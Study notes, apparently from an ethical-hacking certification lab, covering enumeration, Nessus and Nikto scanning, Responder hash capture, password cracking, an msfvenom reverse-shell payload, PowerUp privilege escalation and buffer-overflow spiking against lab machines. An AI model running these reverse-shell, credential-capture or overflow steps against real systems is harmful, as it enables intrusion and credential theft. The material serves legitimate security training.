LDNS (https://www.nlnetlabs.nl), nsec3map (https://github.com), nsec3walker (https://dnscurve.org), and DNSwalk (https://github.com) to perform DNS enumeration on the target domain.

##### Perform DNS Enumeration using Nmap
`nmap --script=broadcast-dns-service-discovery [Target Domain]` : displays a list of all available DNS Services on Target Host along with their associated ports.

`nmap -T4 -p 53 --script dns-brute [Target Domain]`  : `-T4`: specifies the timing template, `-p`: specifies the target port. The result appears displaying a list of all the subdomains associated with the target host along with their IP addresses.

`nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='[Target Domain]'”` : Displays various commons service (SRV) records for a given domain name.

*An SRV (Service) Record is a DNS resource record that specifies information about available services on a network. It includes details such as the service name, protocol, port number, priority, weight, and the target domain or server hosting the service.*

Using this information, attackers can launch web application attacks such as injection attacks, brute-force attacks and DoS attacks on the target domain.

### Perform SMTP Enumeration
The next step is to perform SMTP enumeration. SMTP enumeration is performed to obtain a list of valid users, delivery addresses, message recipients on an SMTP server.

The Simple Mail Transfer Protocol (SMTP) is an internet standard based communication protocol for electronic mail transmission. Mail systems commonly use SMTP with POP3 and IMAP, which enable users to save messages in the server mailbox and download them from the server when necessary. SMTP uses mail exchange (MX) servers to direct mail via DNS. It runs on TCP port 25, 2525, or 587.

##### Perform STP Enumeration using Nmap
`nmap -p 25 --script=smtp-enum-users [Target_IP_Address]` : displays a list of all the possible mail users on the target machine. {**-p**: specifies the port, and **–script**: argument is used to run a given script (here, the script is **smtp-enum-users**)}
![[Pasted image 20241126210302.png]]

`nmap -p 25 --script=smtp-open-relay [Target IP Address] ` : Displays a list of open SMTP Relays on the Target

`nmap -p 25 --script=smtp-commands [Target IP Address]` : A list of all the SMTP commands available in the Nmap directory appears.

### Perform RPC, SMB & FTP Enumeration
- **RPC Enumeration**: Enumerating RPC endpoints enables vulnerable services on these service ports to be identified
- **SMB Enumeration**: Enumerating SMB services enables banner grabbing, which obtains information such as OS details and versions of services running
- **FTP Enumeration**: Enumerating FTP services yields information about port 21 and any running FTP services; this information can be used to launch various attacks such as FTP bounce, FTP brute force, and packet sniffing.

##### Perform RPC, SMB, and FTP Enumeration using Nmap
`nmap -p 21 [Target IP Address]` : If scan shows this port to be open that means FTP Service is running on the Target Machine.

`nmap -T4 -A [Target_IP_Address]` : In this command, -T4: specifies the timing template (the number can be 0-5) and -A: specifies aggressive scan. The aggressive scan option supports OS detection (-O), version scanning (-sV), script scanning (-sC), and traceroute (--traceroute).   
The scan result appears, displaying information regarding open ports, services along with their versions. You can observe the RPC service and NFS service running on the ports 111 and 2049.

`nmap -p [Target Port] -A [Target IP Address]` : Displays that port 445 is open, and giving detailed information under the Host script results section about the running SMB. {In this command, -T4: specifies the timing template (the number can be 0-5) and -A: specifies aggressive scan. The aggressive scan option supports OS detection (-O), version scanning (-sV), script scanning (-sC), and traceroute (--traceroute).   }

`nmap -p [Target Port] -A [Target IP Address]` : Displays that port 21 is open or not and gives traceroute information.
### Perform Enumeration using Various Enumeration Tools

##### Enumerate Information using Global Network Inventory
Global Network Inventory is used as an audit scanner in zero deployment and agent-free environments. It scans single or multiple computers by IP range or domain, as defined by the Global Network Inventory host file.

##### Enumerate Information using Advanced IP Scanner
Using these options, you can ping, traceroute, transfer files, chat, send a message, connect to the target machine remotely (using **Radmin**), etc. To use the Radmin option, you need to install Radmin Viewer, which you can download at https://www.radmin.com.

##### Enumerate Information from Windows and Samba Hosts using Enum4linux
Enum4linux is a tool for enumerating information from Windows and Samba systems. It is used for share enumeration, password policy retrieval, identification of remote OSes, detecting if hosts are in a workgroup or a domain, user listing on hosts, listing group membership information, etc.

`enum4linux -u martin -p apple -n [Target IP Address]` : Enumerates the Target System and displays the NetBIOS Information under the Nbtstat Information,
{-u user: specifies the username to use and -p pass: specifies the password}

`enum4linux -u martin -p apple -U [Target IP Address]` : Enum4linux starts enumerating and displays data such as Target Information, Workgroup/Domain, domain SID (security identifier), and the list of users, along with their respective RIDs (relative identifier).

`enum4linux -u martin -p apple -o [Target IP Address]` : `-o` retrieves the OS information.

`enum4linux -u martin -p apple -P [Target IP Address]` : `-P` retrieves the password policy information.

`enum4linux -u martin -p apple -G [Target IP Address]` : `-G` retrieves group and member list

`enum4linux -u martin -p apple -S [Target IP Address]` : `-S` retrieves sharelist.

# Vulnerability Analysis
Vulnerability assessments scan networks for known security weaknesses: it recognizes, measures, and classifies security vulnerabilities in a computer system, network, and communication channel; and evaluates the target systems for vulnerabilities such as missing patches, unnecessary services, weak authentication, and weak encryption. Additionally, it assists security professionals in securing the network by determining security loopholes or vulnerabilities in the current security mechanism before attackers can exploit them.

The information gleaned from a vulnerability assessment helps you to identify weaknesses that could be exploited and predict the effectiveness of additional security measures in protecting information resources from attack.

### Perform Vulnerability Research with Vulnerability Scoring Systems and Databases
First step is to search for vulnerabilities in the target system or network using vulnerability scoring systems and databases. Vulnerability research provides awareness of advanced techniques to identify flaws or loopholes in the software that could be exploited. Using this information, you can use various tricks and techniques to launch attacks on the target system.

##### Perform Vulnerability Research in Common Weakness Enumeration (CWE)
Common Weakness Enumeration (CWE) is a category system for software vulnerabilities and weaknesses. It has numerous categories of weaknesses that means that CWE can be effectively employed by the community as a baseline for weakness identification, mitigation, and prevention efforts. Further, CWE has an advanced search technique with which you can search and view the weaknesses based on research concepts, development concepts, and architectural concepts.

`https://cwe.mitre.org/` : Website  for Common Weakness Enumeration
`https://cve.mitre.org/` : Website for Common Vulnerabilities and Exposures
`https://nvd.nist.gov/` : Website for National Vulnerability Database

### Perfom Vulnerability Assessment using Various Vulnerability Assessment Tools
A vulnerability assessment is an in-depth examination of the ability of a system or application, including current security procedures and controls, to withstand exploitation. It scans networks for known security weaknesses, and recognizes, measures, and classifies security vulnerabilities in computer systems, networks, and communication channels. It identifies, quantifies, and ranks possible vulnerabilities to threats in a system. Additionally, it assists security professionals in securing the network by identifying security loopholes or vulnerabilities in the current security mechanism before attackers can exploit them.

##### Perform Vulnerability Analysis using OpenVAS
Click Applications at the top of the Desktop window and navigate to Pentesting --> Vulnerability Analysis --> Openvas - Greenbone --> Start Greenbone Vulnerability Manager Service to launch OpenVAS tool.

OpenVAS login page appears, log in with Username and Password as admin and password and click the Login button.

##### Perform Vulnerability Scanning using Nessus
Nessus is an assessment solution for identifying vulnerabilities, configuration issues, and malware, which can be used to penetrate networks. It performs vulnerability, configuration, and compliance assessment. It supports various technologies such as OSes, network devices, hypervisors, databases, tablets/phones, web servers, and critical infrastructure.

1.   
    Launch any browser, (here, **Microsoft Edge**). In the address bar of the browser place your mouse cursor and type **https://localhost:8834/** and press **Enter**
    
2. **Your connection isn't private** page appears, expand the **Advanced** section and click **continue to localhost (unsafe)**
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab116932/screens/cfa4w4lz.jpg)
    
3. In the Nessus login page use **Admin** as the username and **password** as Password and click **Sign In**
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab116932/screens/keva3opw.jpg)
    
4. Nessus begins to initialize; this will take some time. On completion of initialization, the Nessus dashboard appears along with the **Welcome to Nessus Essentials** pop-up. Close the pop-up.
    
    > In the **Let Microsoft Edge save and fill your password for this site next time?** pop-up, click **Never**.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab116932/screens/yrih0wdb.jpg)
    
5. The **Nessus Essentials** dashboard appears; click **Policies** under **RESOURCES** section from the pane on the left.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab116932/screens/kjua3kzl.jpg)
    
6. The **Policies** window appears; click **Create a new policy**.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab116932/screens/amxndban.jpg)
    
7. The **Policy Templates** window appears; click **Advanced Scan**.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab116932/screens/gzlw0qnk.jpg)
    
8. The **New Policy / Advanced Scan** section appears.
    
9. In the **Settings** tab under the **BASIC** setting type, specify a policy name in the **Name** field (here, **NetworkScan_Policy**), and give a **Description** about the policy (here, **Scanning a Network**).
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab116932/screens/a1z5tabz.jpg)
    
10. In the **Settings** tab, click **DISCOVERY** setting type and turn off the **Ping the remote host** option from the right pane.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab116932/screens/1qmrdj5q.jpg)
    
11. Select the **Port Scanning** option under the **DISCOVERY** setting type, and then click the **Verify open TCP ports found by local port enumerators** checkbox. Leave the other fields with default options, as shown in the screenshot.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab116932/screens/xkdejj15.jpg)
    
12. Select the **ADVANCED** setting type. In the right pane, under the **Performance Options** settings, set the values of **Max number of concurrent TCP sessions per host** and **Max number of concurrent TCP sessions per scan** to **Unlimited**.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab116932/screens/x5miyegg.jpg)
    
13. To configure the credentials of a new policy, click the **Credentials** tab and select **Windows** from the options.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab116932/screens/hxtsaohi.jpg)
    
14. Specify the **Username** and **Password** in the window. Here, the specified credentials are **CEH123**/**qwerty@123**.
    
    > Re-enter the created user account credentials, **Admin/password**, if session timeout notification pop-up appears.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab116932/screens/nahse1xm.jpg)
    
15. Click the **Plugins** tab and do not alter any of the options in this window. Click the **Save** button.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab116932/screens/1d5xzzuj.jpg)
    
16. A **Policy saved successfully** notification pop-up appears, and the policy is added in the **Policies** window, as shown in the screenshot.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab116932/screens/tf0ooqnj.jpg)
    
17. Now, click **Scans** from the menu bar to open **My Scans** window; click **Create a new scan**.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab116932/screens/jzxdai52.jpg)
    
18. The **Scan Templates** window appears. Click the **User Defined** tab and select **NetworkScan_Policy**.
    
    > If an **API Disabled** pop-up appears, refresh the browser and log in again to the **Nessus Essentials** using credentials (**Admin/password**), if it still shows the API Disabled error then clear the cache of the browser by clicking on the three dots at the top right of the browser --> Click on History --> Clear History and make sure that cache and cookies are checked and click on clear and login to the **Nessus Essentials** again.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab116932/screens/sdu0rep3.jpg)
    
19. The **New Scan / NetworkScan_Policy** window appears. Under **General Settings** in the right pane, input the **Name** of the scan (here, **Local Network**) and enter the **Description** for the scan (here, **Scanning a local network**); in the **Targets** field, enter the IP address of the target on which you want to perform the vulnerability analysis. In this lab, the target IP address is **10.10.1.22 (Windows Server 2022)**.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab116932/screens/uv0q1ld2.jpg)
    
20. Click **Schedule** settings; ensure that the **Enabled** switch is turned off. Click the drop-down icon next to the **Save** button and select **Launch** to start the scan.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab116932/screens/sflvh4fs.jpg)
    
21. The **Scan saved and launched successfully** notification pop-up appears. The scan is launched, and Nessus begins to scan the target.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab116932/screens/yxukifaq.jpg)
    
22. After the completion of the scan: click **Local Network** to view the detailed results.
    
    > It takes approximately 15-20 minutes for the scan.
    
23. The **Local Network** window appears, displaying the summary of target hosts, as well as the **Scan Details** and **Vulnerabilities** categorization under the **Hosts** tab, as shown in the screenshot.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab116932/screens/psiky5lt.jpg)
    
24. Click the **Vulnerabilities** tab, and scroll down to view all the vulnerabilities associated with the target machine.
    
    > The list of vulnerabilities may differ when you perform this task.
    
25. Click these vulnerabilities to view detailed reports about each. For instance, in this lab, we are selecting the first vulnerability in the list, that is, **SSL (Multiple Issues)**.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab116932/screens/ghcdxjj1.jpg)
    
26. The **Local Network** / **SSL (Multiple Issues)** window appears, displaying multiple issues in SNMP service. Click on any issue (here, **SSL Medium…**) to view its detailed information.
    
    ![3unh0oii.jpg](https://labondemand.blob.core.windows.net/content/lab116932/3unh0oii.jpg)
    
27. The report regarding selected vulnerability **SSL Medium Strength Cipher Suites Supported (SWEET32)** appears with detailed information such as plugin details, risk information, vulnerability information, reference information and the solution, and output, as shown in the screenshot.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab116932/screens/dwhdnldn.jpg)
    
28. On completing the vulnerability analysis, click **Scans**, and then click the recently performed scan (here, **Local Network**).
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab116932/screens/abkmnv5b.jpg)
    
29. In the **Local Network** window, click the **Report** tab from the top-right corner, in the **Generate Report** window choose a file format (here, **HTML**) from the available options and click **Generate Report**. By downloading a report, you can access it anytime, instead of logging in to Nessus again and again.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab116932/screens/02izvocc.jpg)
    
30. Once the download is finished, a pop-up appears at the top of the browser; click **Open file**.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab116932/screens/4bklgrgh.jpg)
    
31. The Nessus scan report appears in the **Edge** web browser, as shown in the screenshot.
    
    > Screenshots and browser might differ when you perform this task.
    
32. You can click the **Expand All** option to view the detailed scan report.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab116932/screens/pbcbsj5h.jpg)
    
33. A list of discovered vulnerabilities appears. You can further click on plugins (here, **42873**) to view more detailed information on the vulnerability
    
    > The results might differ when you perform this task.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab116932/screens/20od40ve.jpg)
    
34. The selected plugin details are displayed, as shown in the screenshot.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab116932/screens/ibahbw2e.jpg)
    
35. In this way, you can select a vulnerability of your choice to view the complete details.
    
36. Once the vulnerability analysis is done, switch back to the tab where Nessus is running and click **Admin --> Sign Out** in the top-right corner.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab116932/screens/chvqhfxe.jpg)
    
37. Once the session is successfully logged out, a **Signed out successfully. Goodbye, admin** notification appears.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab116932/screens/s1w1agio.jpg)
    
38. This concludes the demonstration of performing vulnerability assessment using Nessus.


##### Perform Web Servers and Application Vulnerability Scanning using CGI Scanner Nikto
We will use the Tuning option to do a deeper and more comprehensive scan on the target webserver.

A tuning scan can be used to decrease the number of tests performed against a target. By specifying the type of test to include or exclude, faster and focused testing can be completed. This is useful in situations where the presence of certain file types such as XSS or simply “interesting” files is undesired.

In the terminal window, type 1 (here, the target website is https://www.certifiedhacker.com) and press Enter. Nikto starts scanning with all the tuning options enabled.
-h: specifies the target host and x: specifies the Reverse Tuning Options (i.e., include all except specified).

In the terminal window, type `nikto -h (Target Website) -Cgidirs all` : `-Cgidirs`: scans the specified CGI directories; users can use filters such as `“none”` or `“all”` to scan all CGI directories or none). 

`nikto -h (Target Website) -o (File_Name) -F txt` : `-h`: specifies the target, `-o`: specifies the name of the output file, and `-F`: specifies the file format.

# System Hacking
In preparation for hacking a system, you must follow a certain methodology. You need to first obtain information during the footprinting, scanning, enumeration, and vulnerability analysis phases, which can be used to exploit the target system.

There are four steps in the system hacking:
- Gaining Access: Use techniques such as cracking passwords and exploiting vulnerabilities to gain access to the target system
- Escalating Privileges: Exploit known vulnerabilities existing in OSes and software applications to escalate privileges
- Maintaining Access: Maintain high levels of access to perform malicious activities such as executing malicious applications and stealing, hiding, or tampering with sensitive system files
- Clearing Logs: Avoid recognition by legitimate system users and remain undetected by wiping out the entries corresponding to malicious activities in the system logs, thus avoiding detection.

### Gain Access to the System
Password cracking is the process of recovering passwords from the data transmitted by a computer system or stored in it. It may help a user recover a forgotten or lost password or act as a preventive measure by system administrators to check for easily breakable passwords; however, an attacker can use this process to gain unauthorized system access.

##### Perform Active Online Attack to Crack the System's Password using Responder
LLMNR (Link Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) are two main elements of Windows OSes that are used to perform name resolution for hosts present on the same link.

Since the awareness of this attack is low, there is a good chance of acquiring user credentials in an internal network penetration test. By listening for LLMNR/NBT-NS broadcast requests, an attacker can spoof the server and send a response claiming to be the legitimate server. After the victim system accepts the connection, it is possible to gain the victim’s user-credentials by using a tool such as Responder.py.

Responder is an LLMNR, NBT-NS, and MDNS poisoner. It responds to specific NBT-NS (NetBIOS Name Service) queries based on their name suffix. By default, the tool only responds to a File Server Service request, which is for SMB.

Here, we will use the Responder tool to extract information such as the target system’s OS version, client version, NTLM client IP address, and NTLM username and password hash.

`sudo responder -I eth0` is the command to be entered in Linux.
Type : `\\CEH-Tools` in Run of Windows and then Listener will get the access and a hash will be provided, save that hash into a text file and type the command `john hash.txt` , it will try to crack the password for the same.

##### Audit System Passwords using L0phtCrack
L0phtCrack is a tool designed to audit passwords and recover applications. It recovers lost Microsoft Windows passwords with the help of a dictionary, hybrid, rainbow table, and brute-force attacks. It can also be used to check the strength of a password.

In this task, as an ethical hacker or penetration tester, you will be running the L0phtCrack tool by providing the remote machine’s administrator with user credentials. User account passwords that are cracked in a short amount of time are weak, meaning that you need to take certain measures to strengthen them.

Password Auditing Wizard -> Choose Target System (Windows) -> A remote machine -> Add all the details like Host, Credentials -> Choose Audit Type (Thorough Password Audit) -> Save Report as CSV -> Run the job immediately -> Tries to crack the password

##### Find Vulnerabilities on Exploit Sites
Exploit sites contain the details of the latest vulnerabilities of various OSes, devices, and applications. You can use these sites to find relevant vulnerabilities about the target system based on the information gathered, and further download the exploits from the database and use exploitation tools such as Metasploit, to gain remote access.

`https://www.exploit-db.com/` is the website to find vulnerabilities.
**VulDB** (https://vuldb.com), **MITRE CVE** (https://cve.mitre.org), **Vulners** (https://vulners.com), and **CIRCL CVE Search** (https://cve.circl.lu) to find target system vulnerabilities

##### Exploit Client-Side Vulnerabilities and Establish a VNC Session
Attackers use client-side vulnerabilities to gain access to the target machine. VNC (Virtual Network Computing) enables an attacker to remotely access and control the targeted computers using another computer or mobile device from anywhere in the world. At the same time, VNC is also used by network administrators and organizations throughout every industry sector for a range of different scenarios and uses, including providing IT desktop support to colleagues and friends and accessing systems and services on the move.

This task demonstrates the exploitation procedure enforced on a weakly patched Windows 11 machine that allows you to gain remote access to it through a remote desktop connection.

Here, we will see how attackers can exploit vulnerabilities in target systems to establish unauthorized VNC sessions using Metasploit and remotely control these targets.

`msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=[IP Address of Host Machine] LPORT=444 -o /home/attacker/Desktop/Test.exe`  : This command creates TCP Reverse Shell .exe file


We uploaded a File to the target system using the command : `upload /root/PowerSploit/Privesc/PowerUp.ps1`
PowerUp.ps1 is a program that enables a user to perform quick checks against a Windows machine for any privilege escalation opportunities. It utilizes various service abuse checks, .dll hijacking opportunities, registry checks, etc. to enumerate common elevation methods for a target system.

`powershell -ExecutionPolicy Bypass -Command “. .\PowerUp.ps1;Invoke-AllChecks”` - Attackers exploit misconfigured services such as unquoted service paths, service object permissions, unattended installs, modifiable registry autoruns and configurations, and other locations to elevate access privileges. After establishing an active session using Metasploit, attackers use tools such as PowerSploit to detect misconfigured services that exist in the target OS.

Then on typing `run vnc` the Windows Screen with GUI will appear to your Linux.

##### Gain Access to a Remote System using Armitage
Armitage is a Pentesting Software on Linux.
We're using Intense NMAP Scan in it. Using Armitage we can directly create a Windows - Meterpreter_Reverse_Tcp Attack and save it as an `.exe` file and then on running multi/handler - Meterpeter_Reverse_TCP Shell at same LPORT and running the file on the Target Machine, then we can simply gain the access of the system.

##### Gain Access to a Remote System using Ninja Jonin
Ninja Jonin is a combination of two tools; Ninja is installed in victim machine and Jonin is installed on the attacker machine. The main functionality of the tool is to control a remote machine behind any NAT, Firewall and proxy.

Changing the Jonin/config/constant.json by changing the Name to `Server22` and host to `Attacking Machine IP` then sending that to preferred victim and then connecting it to Ninja on the Attacking Machine.

##### Perform Buffer Overflow Attack to Gain Access to a Remote System
A buffer is an area of adjacent memory locations allocated to a program or application to handle its runtime data. Buffer overflow or overrun is a common vulnerability in applications or programs that accept more data than the allocated buffer. This vulnerability allows the application to exceed the buffer while writing data to the buffer and overwrite neighboring memory locations. Further, this vulnerability leads to erratic system behavior, system crash, memory access errors, etc. Attackers exploit a buffer overflow vulnerability to inject malicious code into the buffer to damage files, modify program data, access critical information, escalate privileges, gain shell access, etc.

type generic_send_tcp 10.10.1.11 9999 stats.spk 0 0 and press Enter to send the packages to the vulnerable server.

Here, 10.10.1.11 is the IP address of the target machine (Windows 11), 9999 is the target port number, stats.spk is the spike_script, and 0 and 0 are the values of SKIPVAR and SKIPSTR.

1.   
    Click [Windows 11](https://labclient.labondemand.com/Instructions/5a895bf5-5f95-4504-9515-0e8f8f743e00#) to switch to the **Windows 11** machine, navigate to **E:\CEH-Tools\CEHv12 Module 06 System Hacking\Buffer Overflow Tools\vulnserver**, right-click the file **vulnserver.exe**, and click the **Run as Administrator** option.
    
    > If the **User Account Control** pop-up appears, click **Yes** to proceed.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/gf1ux1ky.jpg)
    
    > If The **Windows Security Alert** window appears; click **Allow access**.
    
2. **Vulnserver** starts running, as shown in the screenshot.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/y0wyx04v.jpg)
    
3. Minimize the **Command Prompt** window running **Vulnserver**.
    
4. Navigate to **E:\CEH-Tools\CEHv12 Module 06 System Hacking\Buffer Overflow Tools\Immunity Debugger**, right-click **ImmunityDebugger_1_85_setup.exe**, and click the **Run as administrator** option.
    
    > If the **User Account Control** pop-up appears, click **Yes** to proceed.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/zcreomzn.jpg)
    
5. **Immunity Debugger Setup** pop-up appears, click **Yes** to install Python.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/5ryhg3hb.jpg)
    
6. The **Immunity Debugger Setup: License Agreement** window appears; click the **I accept** checkbox and then click **Next**.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/feoiygp1.jpg)
    
7. Follow the wizard and install Immunity Debugger using the default settings.
    
8. After completion of installation, click on **close**, **Immunity Debugger Setup** pop-up appears click **OK** to install python.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/u4sbhwhh.jpg)
    
9. **Python Setup** window appears, click **Next** and Follow the wizard to install Python using the default settings.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/glgnj34j.jpg)
    
10. After the completion of the installation, navigate to the **Desktop**, right-click the **Immunity Debugger** shortcut, and click **Run as administrator**.
    
    > If the **User Account Control** pop-up appears, click **Yes** to proceed.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/h5ps035m.jpg)
    
11. The **Immunity Debugger** main window appears, as shown in the screenshot.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/qm3xxx4u.jpg)
    
12. Now, click **File** in the menu bar, and in the drop-down menu, click **Attach**.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/oom1ftm0.jpg)
    
13. The **Select process to attach** pop-up appears; click the **vulnserver** process and click **Attach**.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/narkh3ff.jpg)
    
14. **Immunity Debugger** showing the **vulnerserver.exe** process window appears, as shown in the screenshot.
    
15. You can observe that the status is **Paused** in the bottom-right corner of the window.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/45j3mgfz.jpg)
    
16. Click on the **Run program** icon in the toolbar to run **Immunity Debugger**.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/gffgtcld.jpg)
    
17. You can observe that the status changes to **Running** in the bottom-right corner of the window, as shown in the screenshot.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/yprtcwui.jpg)
    
18. Keep **Immunity Debugger** and **Vulnserver** running, and click [Parrot Security](https://labclient.labondemand.com/Instructions/5a895bf5-5f95-4504-9515-0e8f8f743e00#) switch to the **Parrot Security** machine.
    
19. We will now use the Netcat command to establish a connection with the target vulnerable server and identify the services or functions provided by the server. To do so, click the **MATE Terminal** icon at the top of the **Desktop** window to open a **Terminal** window.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/mbypp3bb.jpg)
    
20. In the **Terminal** window, type **sudo su** and press **Enter** to run the programs as a root user.
    
21. In the **[sudo] password for attacker** field, type **toor** as a password and press **Enter**.
    
    > The password that you type will not be visible.
    
22. Now, type **cd** and press **Enter** to jump to the root directory.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/5pcxrumg.jpg)
    
23. Type **nc -nv 10.10.1.11 9999** and press **Enter**.
    
    > Here, **10.10.1.11** is the IP address of the target machine (**Windows 11**) and **9999** is the target port.
    
24. The **Welcome to Vulnerable Server!** message appears; type **HELP** and press **Enter**.
    
25. A list of **Valid Commands** is displayed, as shown in the screenshot.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/2wjdhrw1.jpg)
    
26. Type **EXIT** and press **Enter** to exit the program.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/a4uzh2ky.jpg)
    
27. Now, we will generate spike templates and perform spiking.
    
    > Spike templates define the package formats used for communicating with the vulnerable server. They are useful for testing and identifying functions vulnerable to buffer overflow exploitation.
    
28. To create a spike template for spiking on the STATS function, type **pluma stats.spk** and press **Enter** to open a text editor.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/gt0mclqk.jpg)
    
29. In the text editor window, type the following script:
    
    **s_readline();**
    
    **s_string(“STATS ”);**
    
    **s_string_variable(“0”);**
    
30. Press **Ctrl+S** to save the script file and close the text editor.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/jytzmwai.jpg)
    
31. Now, in the terminal window, type **generic_send_tcp 10.10.1.11 9999 stats.spk 0 0** and press **Enter** to send the packages to the vulnerable server.
    
    > Here, **10.10.1.11** is the IP address of the target machine (**Windows 11**), **9999** is the target port number, **stats.spk** is the spike_script, and **0** and **0** are the values of **SKIPVAR** and **SKIPSTR**.
    
32. Leave the script running in the terminal window.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/psji0tb2.jpg)
    
33. Now, click [Windows 11](https://labclient.labondemand.com/Instructions/5a895bf5-5f95-4504-9515-0e8f8f743e00#) to switch to the target machine (here, **Windows 11**), and in the **Immunity Debugger** window, you can observe that the process status is still **Running**, which indicates that the STATS function is not vulnerable to buffer overflow. Now, we will repeat the same process with the TRUN function.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/sdmvpb4j.jpg)
    
34. Click [Parrot Security](https://labclient.labondemand.com/Instructions/5a895bf5-5f95-4504-9515-0e8f8f743e00#) switch back to the **Parrot Security** machine.
    
35. In the **Terminal** window, press **Ctrl+C** to terminate stats.spk script.
    
36. Now, type **pluma trun.spk** and press **Enter**.
    
37. In the text editor window, type the following script:
    
    **s_readline();**
    
    **s_string(“TRUN ”);**
    
    **s_string_variable(“0”);**
    
38. Press **Ctrl+S** to save the script file and close the text editor.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/gj02q10k.jpg)
    
39. Now, in the **terminal** window, type **generic_send_tcp 10.10.1.11 9999 trun.spk 0 0** and press **Enter** to send the packages to the vulnerable server.
    
    > Here, **10.10.1.11** is the IP address of the target machine (**Windows 11**), **9999** is the target port number, **trun.spk** is the **spike_script**, and **0** and **0** are the values of **SKIPVAR** and **SKIPSTR**.
    
40. Leave the script running in the terminal window.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/x2e1t5ii.jpg)
    
41. Now, click [Windows 11](https://labclient.labondemand.com/Instructions/5a895bf5-5f95-4504-9515-0e8f8f743e00#) switch to the target machine (here, **Windows 11**), and in the **Immunity Debugger** window, you can observe that the process status is changed to **Paused**, which indicates that the TRUN function of the vulnerable server is having buffer overflow vulnerability.
    
42. Spiking the TRUN function has overwritten stack registers such as EAX, ESP, EBP, and EIP. Overwriting the EIP register can allow us to gain shell access to the target system.
    
43. You can observe in the top-right window that the EAX, ESP, EBP, and EIP registers are overwritten with ASCII value “A”, as shown in the screenshot.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/zbldna05.jpg)
    
44. Click [Parrot Security](https://labclient.labondemand.com/Instructions/5a895bf5-5f95-4504-9515-0e8f8f743e00#) switch to the **Parrot Security** machine and press **Ctrl+Z** to terminate the script running in the terminal window.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/ar2giedl.jpg)
    
45. After identifying the buffer overflow vulnerability in the target server, we need to perform fuzzing. Fuzzing is performed to send a large amount of data to the target server so that it experiences buffer overflow and overwrites the EIP register.
    
46. Click [Windows 11](https://labclient.labondemand.com/Instructions/5a895bf5-5f95-4504-9515-0e8f8f743e00#) switch back to the **Windows 11** machine and close **Immunity Debugger** and the vulnerable server process.
    
47. Re-launch both **Immunity Debugger** and the vulnerable server as an administrator. Now, **Attach** the **vulnserver** process to **Immunity Debugger** and click the **Run program** icon in the toolbar to run **Immunity Debugger**.
    
48. Click [Parrot Security](https://labclient.labondemand.com/Instructions/5a895bf5-5f95-4504-9515-0e8f8f743e00#) to switch back to the **Parrot Security** machine.
    
49. Minimize the **Terminal** window. Click the **Places** menu present at the top of the **Desktop** and select **Network** from the drop-down options.
    
    ![Screenshot](https://labondemand.blob.core.windows.net/content/lab117714/screens/kebddo5f.jpg)
    
50. The **Network** window appears; press **Ctrl+L**. The **Location** field appears; type **smb://10.10.1.11** and press **Enter** to access **Windows 11** shared folders.
    
